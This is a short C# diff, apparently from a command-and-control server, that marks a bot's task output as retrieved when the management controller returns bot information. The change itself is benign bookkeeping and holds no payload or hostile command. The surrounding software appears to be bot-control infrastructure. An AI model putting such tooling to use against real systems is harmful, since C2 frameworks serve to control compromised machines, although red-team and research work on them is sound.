@@ -49,6 +49,8 @@ public class ManagementController : AbstractController
             Task = C2State.TaskManager.GetTask(bot.TaskId)
         };
 
+        bot.OutputRetrieved = true;
+
         return Ok(BotInfo);
     }
 
